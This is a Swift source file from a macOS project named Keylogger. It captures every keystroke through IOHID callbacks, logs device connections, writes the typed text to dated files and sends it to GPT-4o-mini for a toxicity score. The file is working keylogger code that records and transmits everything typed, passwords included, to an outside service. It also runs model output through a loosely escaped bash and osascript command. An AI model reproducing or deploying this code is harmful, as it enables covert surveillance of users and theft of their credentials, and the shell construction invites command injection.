//
//  CallBackFunctions.swift
//  Keylogger
//
//  Created by Skrew Everything on 16/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//

import Foundation
import Cocoa
import Carbon


class CallBackFunctions
{
    static var CAPSLOCK = false
    static var calander = Calendar.current
    static var prev = ""
    static var lastWriteTime = Date()
    static var uniqueNumber = 0
    static var concatenatedString = ""
    static var lastCharTime = Date()
    static var apiWrapper = ApiWrapper()
    static var inactivityTimer: Timer?
    static var inactivityInterval: TimeInterval = 6
    
    static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
        let path = mySelf.devicesData.appendingPathComponent(dateFolder)
        if !FileManager.default.fileExists(atPath: path.path)
        {
            do
            {
                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
            }
            catch
            {
                print("Can't Create Folder")
            }
        }
        
        let fileName = path.appendingPathComponent("Time Stamps").path
        if !FileManager.default.fileExists(atPath: fileName )
        {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
            {
                print("Can't Create File!")
            }
        }
        let fh = FileHandle.init(forWritingAtPath: fileName)
        fh?.seekToEndOfFile()
        let timeStamp = "Connected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
        fh?.write(timeStamp.data(using: .utf8)!)
    }
    
    static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
            
            let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
            let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
            let path = mySelf.devicesData.appendingPathComponent(dateFolder)
            if !FileManager.default.fileExists(atPath: path.path)
            {
                do
                {
                    try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
                }
                catch
                {
                    print("Can't Create Folder")
                }
            }
            
            let fileName = path.appendingPathComponent("Time Stamps").path
            if !FileManager.default.fileExists(atPath: fileName )
            {
                if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
                {
                    print("Can't Create File!")
                }
            }
            let fh = FileHandle.init(forWritingAtPath: fileName)
            fh?.seekToEndOfFile()
            let timeStamp = "Disconnected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
            fh?.write(timeStamp.data(using: .utf8)!)
    }
    
    static func getCurrentKeyboardLayout() -> String? {
//            print("Attempting to get current keyboard layout...")
            
            let properties: [String: Any] = [kTISPropertyInputSourceType as String: kTISTypeKeyboardLayout as String]
            guard let inputSourceList = TISCreateInputSourceList(properties as CFDictionary, false)?.takeRetainedValue() as? [TISInputSource] else {
                print("Failed to create input source list.")
                return nil
            }
//            print("Successfully created input source list.")
            
            guard let inputSource = TISCopyCurrentKeyboardInputSource()?.takeRetainedValue() else {
//                print("Failed to get current keyboard input source.")
                return nil
            }
//            print("Successfully got current keyboard input source.")
            
        for source in inputSourceList {
                    if source == inputSource {
                        guard let layoutData = TISGetInputSourceProperty(source, kTISPropertyInputSourceID) else {
//                            print("Failed to get input source property for kTISPropertyInputSourceID.")
                            return nil
                        }
//                        print("Successfully got input source property for kTISPropertyInputSourceID.")
                        
                        
                        let layoutString = Unmanaged<CFString>.fromOpaque(layoutData).takeUnretainedValue()
                                        let layout = layoutString as String
//                                        print("Successfully cast layoutData to String: \(layout)")
                                        return layout
                    }
                }
            
//            print("Current input source not found in the input source list.")
            return nil
        }
    
    static func loadConfig() {
            if let url = Bundle.main.url(forResource: "config", withExtension: "json") {
                do {
                    let data = try Data(contentsOf: url)
                    if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                        if let interval = json["inactivityInterval"] as? TimeInterval {
                            inactivityInterval = interval
                        }
                    }
                } catch {
                    print("Error loading config: \(error)")
                }
            }
        }
    
    static func extractJSONString(from text: String) -> String? {
            print("Input text: \(text)")  // Log the input text
            
            let pattern = "\\{[\\s\\S]*\\}"
            if let range = text.range(of: pattern, options: .regularExpression) {
                let jsonString = String(text[range])
                print("Extracted JSON string: \(jsonString)")  // Log the extracted JSON string
                return jsonString
            }
            
            print("No JSON string found")  // Log if no JSON string is found
            return nil
        }
    
    static func createNotification(toxicityRate: Int, suggestion: String) {
           let escapedSuggestion = suggestion
               .replacingOccurrences(of: "\"", with: "\\\"")
               .replacingOccurrences(of: "'", with: "'\\''")
           let script = """
           osascript -e 'tell app "System Events" to display dialog "The value \(toxicityRate) is greater than 20. Suggestion: \(escapedSuggestion)" with title "Toxic Alert" buttons {"OK"} default button "OK"' &
           """
           print("Executing script: \(script)")  // Log the script to be executed
           let task = Process()
           task.launchPath = "/bin/bash"
           task.arguments = ["-c", script]
           task.launch()
            task.waitUntilExit()
        }
    
    static func processConcatenatedString(_ concatenatedString: String) -> String {
            var result = ""
            var index = concatenatedString.startIndex

            print("Original concatenatedString: \(concatenatedString)")

            while index < concatenatedString.endIndex {
                let char = concatenatedString[index]
                if char == "\\" {
                    let nextIndex = concatenatedString.index(index, offsetBy: 1)
                    if nextIndex < concatenatedString.endIndex {
                        let nextChar = concatenatedString[nextIndex]
                        if nextChar == "D" {
                            var remainingString = concatenatedString[nextIndex...]
                            if remainingString.hasPrefix("DELETE|BACKSPACE") {
                                while !result.isEmpty && remainingString.hasPrefix("DELETE|BACKSPACE") {
                                    result.removeLast()
                                    print("Processed DELETE|BACKSPACE: \(result)")
                                    index = concatenatedString.index(index, offsetBy: 17) // Move past "DELETE|BACKSPACE"
                                    if index < concatenatedString.endIndex {
                                        remainingString = concatenatedString[index...]
                                    } else {
                                        break
                                    }
                                }
                                continue
                            } else if remainingString.hasPrefix("DOWNARROW") {
                                print("Found prefix: DOWNARROW")
                                index = concatenatedString.index(nextIndex, offsetBy: 9)
                                print("Skipping to index after prefix: \(index)")
                                continue
                            }
                        } else if nextChar == "L" || nextChar == "R" || nextChar == "U" || nextChar == "T" || nextChar == "E" {
                            let remainingString = concatenatedString[nextIndex...]
                            let prefixes_round_brackets = ["LCMD(", "LC(", "LS(", "LA(", "RCMD(", "RC(", "RS(", "RA("]
                            let prefixes_without_round = ["RIGHTARROW", "LEFTARROW", "UPARROW" , "TAB", "ESCAPE"]
                            for prefix in prefixes_round_brackets {
                                if remainingString.hasPrefix(prefix) {
                                    print("Found prefix: \(prefix)")
                                    if let closingParenIndex = remainingString.firstIndex(of: ")") {
                                        index = closingParenIndex
                                        print("Skipping to index after closing parenthesis: \(index)")
                                    } else {
                                        index = concatenatedString.endIndex
                                        print("No closing parenthesis found, skipping to end of string")
                                    }
                                    continue
                                }
                            }
                            
                            for prefix in prefixes_without_round {
                                                            if remainingString.hasPrefix(prefix) {
                                                                print("Found prefix: \(prefix)")
                                                                index = concatenatedString.index(nextIndex, offsetBy: prefix.count - 1)
                                                                print("Skipping to index after prefix: \(index)")
                                                                continue
                                                            }
                                                        }
                        }
                    }
                } else if char.isLetter || char.isPunctuation || char.isWhitespace {
                    result.append(char)
                    print("Appended char: \(char), Result: \(result)")
                }
                index = concatenatedString.index(after: index)
            }

            print("Final processed string: \(result)")
            return result
        }
    
    static func sendApiRequest(with content: String) {
            let processedContent = processConcatenatedString(content)
            apiWrapper.sendFileContent(fileContent: processedContent) { result in
                switch result {
                case .success(let response):
                    print("GPT-4o-mini response: \(response)")

                    if let jsonString = extractJSONString(from: response) {
                        print("JSON String to be parsed: \(jsonString)")  // Log the JSON string to be parsed
                        do {
                            
//                            let sanitizedJsonString = jsonString
//                                                        .replacingOccurrences(of: "'", with: "\"")
//                                                        .replacingOccurrences(of: "\\\"", with: "\\\\\"") // Escape double quotes correctly
//                                                        .replacingOccurrences(of: "\\\\\"", with: "\\\"")
                            
                            if let responseData = jsonString.data(using: .utf8) {
                                print("Response Data: \(String(data: responseData, encoding: .utf8) ?? "nil")")  // Log the response data
                                if let parsedResponse = try JSONSerialization.jsonObject(with: responseData, options: []) as? [String: Any],
                                   let toxicityRate = parsedResponse["toxic_rate"] as? Int,
                                   let suggestion = parsedResponse["suggestion"] as? String {

                                    if toxicityRate > 20 {
                                        createNotification(toxicityRate: toxicityRate, suggestion: suggestion)
                                    }
                                } else {
                                    print("Invalid response format")
                                }
                            } else {
                                print("Error converting JSON string to data")
                            }
                        } catch {
                            print("Error parsing response: \(error)")
                        }
                    } else {
                        print("No valid JSON found in response")
                    }
                case .failure(let error):
                    print("Error sending file content to GPT-4o-mini: \(error)")
                }
            }
        }
    
    static func startInactivityTimer() {
            loadConfig()  // Load the config when starting the timer
            inactivityTimer?.invalidate()
            inactivityTimer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
                if Date().timeIntervalSince(lastCharTime) > inactivityInterval {
                    if !concatenatedString.isEmpty {
                        print("Concatenated String: \(concatenatedString)")
                        
                        // Get today's date
                                            let dateFormatter = DateFormatter()
                                            dateFormatter.dateFormat = "yyyy-MM-dd"
                                            let dateToday = dateFormatter.string(from: Date())
                                            
                                            // Get the executable's directory
                                            let executableURL = URL(fileURLWithPath: CommandLine.arguments[0])
                                            let executableDirectory = executableURL.deletingLastPathComponent()
                                            
                                            // Create the folder path
                                            let folderPath = executableDirectory.appendingPathComponent("Data/Key")
                                            print("Folder Path: \(folderPath.path)")
                                            
                                            // Create the folder if it doesn't exist
                                            if !FileManager.default.fileExists(atPath: folderPath.path) {
                                                do {
                                                    try FileManager.default.createDirectory(at: folderPath, withIntermediateDirectories: true, attributes: nil)
                                                    print("Folder created successfully")
                                                } catch {
                                                    print("Can't Create Folder: \(error)")
                                                }
                                            }
                                            
                                            // Create the file path
                                            let filePath = folderPath.appendingPathComponent("\(dateToday).txt")
                                            print("File Path: \(filePath.path)")
                                            
                                            // Create the file if it doesn't exist
                                            if !FileManager.default.fileExists(atPath: filePath.path) {
                                                FileManager.default.createFile(atPath: filePath.path, contents: nil, attributes: nil)
                                                print("File created successfully")
                                            }
                                            
                                            // Write the concatenated string to the file
                                            if let fileHandle = FileHandle(forWritingAtPath: filePath.path) {
                                                fileHandle.seekToEndOfFile()
                                                // Format the timestamp
                                                                        let timestampFormatter = DateFormatter()
                                                                        timestampFormatter.dateFormat = "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'"
                                                                        timestampFormatter.timeZone = TimeZone(secondsFromGMT: 0)
                                                                        let timeStamp = timestampFormatter.string(from: Date())
                                                let logEntry = "\(timeStamp): \(concatenatedString)\n"
                                                if let data = logEntry.data(using: .utf8) {
                                                    fileHandle.write(data)
                                                    print("Data written to file successfully")
                                                }
                                                fileHandle.closeFile()
                                            } else {
                                                print("Can't open file for writing")
                                            }
                        sendApiRequest(with: concatenatedString)
                        concatenatedString = ""
                    }
                }
            }
        }
    
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
            let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
            let elem: IOHIDElement = IOHIDValueGetElement(device)
            
            let keyboardLayout = getCurrentKeyboardLayout()
            if (IOHIDElementGetUsagePage(elem) != 0x07) {
                return
            }
            let scancode = IOHIDElementGetUsage(elem)
            if (scancode < 4 || scancode > 231) {
                return
            }
            let pressed = IOHIDValueGetIntegerValue(device)
            
            lastCharTime = Date()
            startInactivityTimer()
            
            if pressed == 1 {
                if scancode == 57 {
                    CallBackFunctions.CAPSLOCK = !CallBackFunctions.CAPSLOCK
                    return
                }
                if scancode >= 224 && scancode <= 231 {
                    concatenatedString += mySelf.keyMap[scancode]![0] + "("
                    return
                }
                if ((4...29).contains(scancode) || [47, 48, 49, 51, 52, 54, 55].contains(scancode)) && (keyboardLayout == "com.apple.keylayout.Russian" || keyboardLayout == "com.apple.keylayout.RussianWin") {
                    concatenatedString += mySelf.keyMap[scancode]![2]
                } else {
                    if CallBackFunctions.CAPSLOCK {
                        concatenatedString += mySelf.keyMap[scancode]![1]
                    } else {
                        concatenatedString += mySelf.keyMap[scancode]![0]
                    }
                }
            } else {
                if scancode >= 224 && scancode <= 231 {
                    concatenatedString += ")"
                }
            }
        }
}
